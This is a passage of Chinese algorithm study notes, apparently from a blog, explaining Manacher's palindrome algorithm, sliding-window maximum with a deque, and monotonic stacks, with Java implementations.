punctuation">)</span> arr<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">++</span>cn<span class="token punctuation">;</span>        <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>cn <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> cn <span class="token operator">=</span> arr<span class="token punctuation">[</span>cn<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> arr<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> arr<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Manacher"><a href="#Manacher" class="headerlink" title="Manacher"></a>Manacher</h2><p>求解字符串的最长回文子串长度</p><h3 id="1-0-1"><a href="#1-0-1" class="headerlink" title="1.0"></a>1.0</h3><p>经典解法，对于字符串”1221ab”，插入特殊字符”#”，-&gt; “#1#2#2#1#a#b#”，然后从头开始，每个字母往两边扩，记录长度然后/2即为真正的以该字母为中心的（对于偶数长度回文子串就是以一个虚轴为中心）回文子串，显然这种暴力方法时间复杂度为O(n2)</p><blockquote><p>插入的特殊字符可以是字符串的字符，因为在比较的时候都是插入的特殊字符与插入的特殊字符比较，而原先的字符也只与原先的字符比较，井水不犯河水</p></blockquote><h3 id="2-0-1"><a href="#2-0-1" class="headerlink" title="2.0"></a>2.0</h3><p>对于Manacher方法来说，需要引入额外变量，</p><p>回文半径数组，即记录每个字母往两边扩得到的回文子串的半径</p><p>变量r，之前扩的所有位置中，所到达的最右回文子串的右边界位置（即只要有更加往右的回文子串，就更新r为该子串右边界）</p><p>变量c，变量r的这个子串的中心轴位置</p><p>r和c初始化都为-1</p><p>那么从头开始遍历</p><p>1）当前位置i &gt; r，只能从该位置开始向两边扩，扩充完成后，更新r和c</p><p>2）当前位置i&lt;=r，字符串情况如下</p><p>l, …, i’, …, c, …, i, …, r</p><p>i’即为i关于c对称的位置，于是有了下面3种情况</p><ol><li><p>以i’为中心的回文子串严格在l和r内部，l, ..(., i’, .).., c, …, i, …, r ，那么位置i的答案与位置i’的答案相同</p><blockquote><p>证明：l, ..x(., i’, .)y.., c, ..y(., i, .)x.., r</p><p>显然x不等于y，关于c对称，所以答案相同</p></blockquote></li><li><p>以i’为中心的回文子串严格在l外部，(…, l, …, i’, .).., c, …, i, …, r ，那么位置i的答案回文半径就是i - r这一段，(…, l, …, i’, .).., c, ..(…, i, …, r)</p><blockquote><p>证明：<img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/zuoshen-algorithm/algorithm4_f6.png"></p><p>l关于i’对称点l’，r关于i对称点r’，则甲乙两区域一定都是回文，因为在l和r之间关于c对称</p><p>x = y = z, x不等于p，所以z不等于p，所以回文子串只有r’到r</p></blockquote></li><li><p>以i’为中心的回文子串正好与l压线，那么位置r’到r这一段一定是回文，但是需要再往外扩检查是否是回文</p><p> <img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/zuoshen-algorithm/algorithm4_f7.png"></p></li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">manacherString</span><span class="token punctuation">(</span><span class="token class-name">String</span> str<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> chars <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> res <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span>chars<span class="token punctuation">.</span>length<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>res<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        res<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>i<span class="token operator">%</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">?</span> <span class="token string">'#'</span> <span class="token operator">:</span> chars<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">maxLength</span><span class="token punctuation">(</span><span class="token class-name">String</span> str<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>str <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> str<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> chars <span class="token operator">=</span> <span class="token function">manacherString</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span>chars<span class="token punctuation">.</span>length<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> r <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// 这里的r是右边界再往右一个位置</span>    <span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> res <span class="token operator">=</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span>MIN_VALUE<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>chars<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment">// 先拿到至少不用检查的区域</span>        <span class="token comment">// 如果i在r外，只能向两边扩，所以至少自身这个字符是不需要检查的，至少不用检查的区域就是1</span>        <span class="token comment">// i在r内的情况，综合3种子情况来看，至少不用检查的区域第一种情况是arr[i']，比r-i小</span>        <span class="token comment">// 而第二种和第三种情况至少不用检查的区域就是r-i</span>        arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i <span class="token operator">&lt;</span> r <span class="token operator">?</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>r<span class="token operator">-</span>i<span class="token punctuation">,</span> arr<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span>c<span class="token operator">-</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token comment">// 下面不管哪种情况，都开始往外扩检查</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>i <span class="token operator">+</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> chars<span class="token punctuation">.</span>length <span class="token operator">&amp;&amp;</span> i <span class="token operator">-</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>chars<span class="token punctuation">[</span>i <span class="token operator">+</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">==</span> chars<span class="token punctuation">[</span>i <span class="token operator">-</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// 往外扩发现有一样的，就+1</span>            <span class="token comment">// 虽然只有第一个大情况和第二个大情况的第3个子情况才真正的需要往外扩</span>            <span class="token comment">// 但是另外两种进入这个while循环会直接被break掉，所以代码精简，就可以这样写</span>            <span class="token keyword">else</span> <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>i <span class="token operator">+</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> r<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            r <span class="token operator">=</span> i <span class="token operator">+</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            c <span class="token operator">=</span> i<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        res <span class="token operator">=</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token comment">// 带着特殊字符的回文半径-1即是真正回文子串长度</span>    <span class="token keyword">return</span> res <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>Manacher算法最重要的部分是回文半径数组，这个数组可以帮助我们解决很多问题</p></blockquote><h2 id="维持窗口最值"><a href="#维持窗口最值" class="headerlink" title="维持窗口最值"></a>维持窗口最值</h2><p>有一个数组，有一个窗口有左边界和右边界，左右边界都只能向右滑动，而且左边界不能超过右边界，要求能够随时得到窗口内的最大值</p><p>使用双端队列，存储数组下标，并且保证队列中从头到尾的值是严格从大到小的</p><p>右边界向右滑动时</p><p>1）该值大于等于队尾的值，弹出队尾，一直弹到小于队尾的值为止，然后把该值放到队列中（弹出去的就不需要管了）</p><p>2）该值小于队尾的值，就直接放到队尾即可</p><p>左边界向右滑动时，那么由于左边界滑动掉出窗口的该值</p><p>1）是队头的值，弹出队头</p><p>2）不是，就不用管</p><p>所以队头就一直是窗口中的最大值</p><blockquote><p>要求最小值的话就让队列从小到大</p></blockquote><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>有一个整型数组arr和一个大小为w的窗口从数组的最左边滑到最右边，窗口每次向右边滑一个位置</p><p>例如，数组为[4,3,5,4,3,3,6,7]，窗口大小为3时:</p><p>[4 3 5]4 3 3 6 7 窗口中最大值为5</p><p>4[3 5 4]3 3 6 7 窗口中最大值为5</p><p>4 3[5 4 3]3 6 7 窗口中最大值为5</p><p>4 3 5[4 3 3]6 7 窗口中最大值为4</p><p>4 3 5 4[3 3 6]7 窗口中最大值为6</p><p>4 3 5 4 3[3 6 7]  窗口中最大值为7</p><p>如果数组长度为n，窗口大小为w，则一共产生n-w+1个窗口的最大值。</p><p>请实现一个函数</p><p>输入：整型数组arr，窗口大小为w</p><p>输出：一个长度为n-w+1的数组res，res[i]表示每一种窗口状态下的以本题为例，结果应该返回{5,5,5,4,6,7}</p><blockquote><p>本题就是上面的结构的特殊化，每次左边界和右边界都是一起向右滑动</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">slidingWindowMax</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> w<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>arr <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> arr<span class="token punctuation">.</span>length <span class="token operator">&lt;</span> w <span class="token operator">||</span> w <span class="token operator">&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token class-name">LinkedList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> res <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span>arr<span class="token punctuation">.</span>length <span class="token operator">-</span> w <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>list<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> arr<span class="token punctuation">[</span>list<span class="token punctuation">.</span><span class="token function">peekLast</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> list<span class="token punctuation">.</span><span class="token function">pollLast</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        list<span class="token punctuation">.</span><span class="token function">addLast</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 左边界滑动掉出窗口的该值是否是队头的值</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>list<span class="token punctuation">.</span><span class="token function">peekFirst</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> i <span class="token operator">-</span> w<span class="token punctuation">)</span> list<span class="token punctuation">.</span><span class="token function">pollFirst</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 形成窗口，取得最大值放在res中</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>i <span class="token operator">>=</span> w<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> res<span class="token punctuation">[</span>i<span class="token operator">-</span>w<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>list<span class="token punctuation">.</span><span class="token function">peekFirst</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="单调栈"><a href="#单调栈" class="headerlink" title="单调栈"></a>单调栈</h2><p>数组，对每一个数，求这个数左边最近的比它大的位置，右边最近的比它大的位置</p><h3 id="1-0-无重复数字"><a href="#1-0-无重复数字" class="headerlink" title="1.0 无重复数字"></a>1.0 无重复数字</h3><p>设立一个栈，存储数组下标，从栈底到栈顶的值是从大到小，遍历数组</p><p>1）该值小于栈顶，入栈</p><p>2）该值大于栈顶，此时的栈顶出栈，开始得到这个出栈的栈顶的信息，左边最近的比它大的即为新栈顶（没有就是无），右边的即为等待入栈的该值（没有就是无），直到该值小于栈顶为止，入栈即可</p><p>3）清算阶段，遍历完成之后，如果栈中还有值的话，开始一个一个出栈，每个值的信息与2）同理</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">monotonousStackNoRepeat</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> stack <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> res <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span>arr<span class="token punctuation">.</span>length<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> arr<span class="token punctuation">[</span>stack<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> temp <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            res<span class="token punctuation">[</span>temp<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">:</span> stack<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            res<span class="token punctuation">[</span>temp<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> temp <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        res<span class="token punctuation">[</span>temp<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">:</span> stack<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        res<span class="token punctuation">[</span>temp<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-0-有重复数字"><a href="#2-0-有重复数字" class="headerlink" title="2.0 有重复数字"></a>2.0 有重复数字</h3><p>栈存放关于下标的链表，依然是从栈底到栈顶的值是从大到小</p><p>遇到相等的值则存放到同样值的链表尾部</p><p>当出栈后，需要用到新栈顶的信息时，选择栈顶链表的尾部作为左边最近的比它大的</p><blockquote><p>想要找两边比它小的就让栈从小到大即可</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">monotonousStack</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">List</span><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span><span class="token punctuation">></span></span> stack <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> res <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span>arr<span class="token punctuation">.</span>length<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> arr<span class="token punctuation">[</span>stack<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> temp <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> curpeek <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token keyword">null</span> <span class="token operator">:</span> stack<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> leftIndex <span class="token operator">=</span> curpeek <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">:</span> curpeek<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>curpeek<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Integer</span> each<span class="token operator">:</span>temp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                res<span class="token punctuation">[</span>each<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> leftIndex<span class="token punctuation">;</span>                res<span class="token punctuation">[</span>each<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> arr<span class="token punctuation">[</span>stack<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">==</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            stack<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>list<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> temp <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> curpeek <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token keyword">null</span> <span class="token operator">:</span> stack<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> leftIndex <span class="token operator">=</span> curpeek <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">:</span> curpeek<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>curpeek<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Integer</span> each<span class="token operator">:</span>temp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            res<span class="token punctuation">[</span>each<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> 